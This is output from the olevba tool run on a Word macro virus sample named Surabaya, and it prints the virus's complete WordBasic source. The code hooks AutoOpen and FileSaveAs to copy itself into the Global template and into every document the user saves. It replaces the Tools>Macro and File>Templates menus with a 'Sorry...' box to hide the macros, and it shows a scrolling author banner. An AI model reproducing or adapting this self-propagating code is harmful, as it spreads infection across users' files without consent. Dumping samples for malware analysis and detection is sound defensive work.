olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Surabaya-3b9dcd7c73f7a071487665c1470144eab99c8693
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Surabaya-3b9dcd7c73f7a071487665c1470144eab99c8693 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Surabaya-3b9dcd7c73f7a071487665c1470144eab99c8693 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim HitungM
Dim i
Dim Yesinstall
Dim mom$
Dim sMacro$
Dim ExecuteOnly
On Error GoTo -1: On Error GoTo Abort
HitungM = WordBasic.CountMacros(0, 0)
For i = 1 To HitungM
    If WordBasic.[MacroName$](i, 0, 0) = "Plong" Then
        Yesinstall = -1
    End If
Next i

If Not Yesinstall Then
    WordBasic.SetProfileString "Author", "Name", "TeBeYe`93 The ICE-Man"
    mom$ = WordBasic.[FileName$]()
    sMacro$ = mom$ + ":FileSaveAs"
    WordBasic.MacroCopy sMacro$, "Global:FileSaveAs", ExecuteOnly
    sMacro$ = mom$ + ":AutoOpen"
    WordBasic.MacroCopy sMacro$, "Global:AutoOpen", ExecuteOnly
    sMacro$ = mom$ + ":Autoexec"
    WordBasic.MacroCopy sMacro$, "Global:Autoexec", ExecuteOnly
    sMacro$ = mom$ + ":ToolsMacro"
    WordBasic.MacroCopy sMacro$, "Global:ToolsMacro", ExecuteOnly
    sMacro$ = mom$ + ":FileTemplates"
    WordBasic.MacroCopy sMacro$, "Global:FileTemplates", ExecuteOnly
    sMacro$ = mom$ + ":Plong"
    WordBasic.MacroCopy sMacro$, "Global:Plong", ExecuteOnly
End If

Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Surabaya-3b9dcd7c73f7a071487665c1470144eab99c8693 - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sme$
Dim yesmacro$
Dim ExecuteOnly
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo susah
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sme$ = WordBasic.[FileName$]()
yesmacro$ = sme$ + ":AutoOpen"
WordBasic.MacroCopy "Global:AutoOpen", yesmacro$, ExecuteOnly
yesmacro$ = sme$ + ":FileSaveAs"
WordBasic.MacroCopy "Global:FileSaveAs", yesmacro$, ExecuteOnly
yesmacro$ = sme$ + ":Autoexec"
WordBasic.MacroCopy "Global:Autoexec", yesmacro$, ExecuteOnly
yesmacro$ = sme$ + ":ToolsMacro"
WordBasic.MacroCopy "Global:ToolsMacro", yesmacro$, ExecuteOnly
yesmacro$ = sme$ + ":FileTemplates"
WordBasic.MacroCopy "Global:FileTemplates", yesmacro$, ExecuteOnly
yesmacro$ = sme$ + ":Plong"
WordBasic.MacroCopy "Global:Plong", yesmacro$, ExecuteOnly
WordBasic.FileSaveAs dlg
GoTo selesai

susah:
If Err.Number <> 102 Then
        WordBasic.FileSaveAs dlg
End If
selesai:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Autoexec.bas 
in file: Virus.MSWord.Surabaya-3b9dcd7c73f7a071487665c1470144eab99c8693 - OLE stream: 'Macros/VBA/Autoexec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim hitung
Public Sub MAIN()
Dim pesan$
Dim i
Dim j
Dim k
hitung = 0
On Error GoTo -1: On Error GoTo no
pesan$ = " Lontong Micro Device (c) 1993 By ICE-Man "

For i = 1 To Len(pesan$)
        WordBasic.MsgBox WordBasic.[Right$](pesan$, i), -1
        For j = 1 To 50
        Next j
Next i

For j = 1 To 200
Next j

For k = 1 To Len(pesan$)
        WordBasic.MsgBox WordBasic.[Right$](pesan$, (Len(pesan$) - k)), -1
        For j = 1 To 50
        Next j
Next k
no:
End Sub
-------------------------------------------------------------------------------
VBA MACRO ToolsMacro.bas 
in file: Virus.MSWord.Surabaya-3b9dcd7c73f7a071487665c1470144eab99c8693 - OLE stream: 'Macros/VBA/ToolsMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
On Error GoTo -1: On Error GoTo wis
WordBasic.MsgBox "Sorry..."
wis:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileTemplates.bas 
in file: Virus.MSWord.Surabaya-3b9dcd7c73f7a071487665c1470144eab99c8693 - OLE stream: 'Macros/VBA/FileTemplates'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
On Error GoTo -1: On Error GoTo wis
WordBasic.MsgBox "Sorry..."
wis:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Plong.bas 
in file: Virus.MSWord.Surabaya-3b9dcd7c73f7a071487665c1470144eab99c8693 - OLE stream: 'Macros/VBA/Plong'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Rem This Macro was created by : The ICE - "Yes"  Man
Rem
Rem         Allah Swt always be with All of You ....
Rem
Rem                             Surabaya, 09-09-1996
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

